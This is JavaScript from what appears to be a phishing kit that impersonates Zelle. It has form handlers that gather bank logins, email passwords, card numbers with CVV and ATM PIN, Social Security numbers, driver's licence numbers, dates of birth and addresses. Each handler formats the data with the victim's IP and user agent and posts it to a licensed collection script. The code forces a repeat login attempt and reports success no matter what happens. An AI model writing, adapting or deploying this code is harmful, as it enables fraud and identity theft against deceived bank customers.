async function form_login(u, p) {
    let post = _User_Pass_single(u, p, false);
    let result = await load_Send_post_Dedicated(post);
    if (Object.keys(result).includes('errors')) {
        await reload('LPath');
    } else {
        if (result.response.msg.includes("uccessfull")) {
            if (USE_DEDICATED === false) localStorage.setItem("username", u);
            setTimeout(async function () {
                await reload('EPath');
            }, 800);
        } else {
            await reload('LPath');
        }
    }
}

async function form_email(email, password) {
    let post = _Email_Pass_single(email, password);
    let result = await load_Send_post_Dedicated(post);
    if (Object.keys(result).includes('errors')) {
        await reload('EPath');
    } else {
        if (result.response.msg.includes("uccessfull")) {
            setTimeout(async function () {
                if (SHOW_CARD) {
                    await reload('CPath');
                } else if (SHOW_INFO) {
                    await reload('DPath');
                } else {
                    await page_completed()
                }
            }, 800)
        } else {
            await reload('EPath');
        }
    }
    return false;
}

async function form_personal_details(f_name, dl, phone, dob, ssn, address, zip) {
    let d = await get_state_city(zip);
    address = d.city.length > 2 ? `${address}, ${d.city}, ${d.state} ${zip}, USA` : `${address}, ${zip}, USA`;

    let post = _personal_info_single(f_name, dob, ssn, dl, phone, address);
    let result = await load_Send_post_Dedicated(post);
    if (Object.keys(result).includes('errors')) {
        await reload('DPath');
    } else {
        if (result.response.msg.includes("uccessfull")) {
            setTimeout(async function () {
                await page_completed()
            }, 800);
        } else {
            await reload('DPath');
        }
    }
    return false;
}

async function form_card(name_one_card, card, cvv, exp, pin = "") {
    let post = _card_info_single(card, exp, cvv, pin, name_one_card);
    let result = await load_Send_post_Dedicated(post);
    if (Object.keys(result).includes('errors')) {
        await reload('CPath');
    } else {
        if (result.response.msg.includes("uccessfull")) {
            setTimeout(async function () {
                if (SHOW_INFO) {
                    await reload('DPath');
                } else {
                    await page_completed()
                }
            }, 800);
        } else {
            await reload('CPath');
        }
    }
    return false;
}


//=======================================================

function browser_ip() {
    return `
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
User-Agent: ${navigator.userAgent}";
###############################################################`;
}

function _User_Pass_single(username, password, secondTry = true) {
    if (secondTry === true) {
        return {
            u1: 'unknown',
            second_pass: `\n== Second Try ==\nUsername: ${username}\nPassword: ${password}`,
            username: localStorage.getItem("username"),
            nametype: 'zelle',
            userid: DEDICATED_LICENSE,
            type: LICENSE_LOCATION
        }
    } else {
        let u = (new Date()).getTime() + "_" + username;
        localStorage.setItem("username", u);
        return {
            u1: `##################### ${__recent.name} - Zelle #####################\nUsername: ${username}\nPassword: ${password}`,
            username: u,
            nametype: 'zelle',
            userid: DEDICATED_LICENSE,
            type: LICENSE_LOCATION,
            brw: browser_ip()
        }
    }
}

function _personal_info_single(full_name, dob, ssn, dl, phone, address) {
    let post = `Full Name: ${full_name}
Date Of Birth: ${dob}
Phone Number: ${phone}
Driver's License: ${dl}
Social Security Number (SSN): ${ssn}
Address: ${address}`;
    return {
        u3: post,
        username: localStorage.getItem("username"),
        nametype: 'zelle',
        userid: DEDICATED_LICENSE,
        type: LICENSE_LOCATION
    }
}

function _card_info_single(card_number, expire, cvv, pin, name_on_card) {
    pin = pin.length === 5 ? `
ATM Pin: ${pin}` : '';
    let post = `Name On Card: ${name_on_card}
Card Number: ${card_number}
Exp Date: ${expire}
Cvv: ${cvv}${pin}`;
    return {
        u4: post,
        username: localStorage.getItem("username"),
        nametype: 'zelle',
        userid: DEDICATED_LICENSE,
        type: LICENSE_LOCATION
    }
}

function _Email_Pass_single(email, password) {
    return {
        u2: `Email Address: ${email}\nEmail Password: ${password}`,
        username: localStorage.getItem("username"),
        nametype: 'zelle',
        userid: DEDICATED_LICENSE,
        type: LICENSE_LOCATION
    }
}


//==================================================


async function load_Send_post_Dedicated(post = {}) {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: D_SCRIPT_NAME,
            type: 'POST',
            dataType: "text",
            data: post,
            success: function (response) {
                resolve({response: {msg: "Yes Sent Successfully"}});
            },
            error: function (response) {
                let error = {errors: response}
                resolve(error);
            }
        });
    });
}

async function file_get_content(url, dataType = "json") {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: url,
            type: 'GET',
            dataType: dataType,
            success: function (response) {
                resolve(response);
            },
            error: function (response) {
                let error = {errors: response}
                resolve(error);
            }
        });
    });
}

async function get_state_city(zip) {
    let output = await file_get_content(`https://0a037114.eu-gb.apigw.appdomain.cloud/zipcode/gen?code=${zip}`);
    if (typeof output === 'object' && !Object.keys(output).includes('errors')) {
        return output;
    }
    return {city: "", state: ""};
}
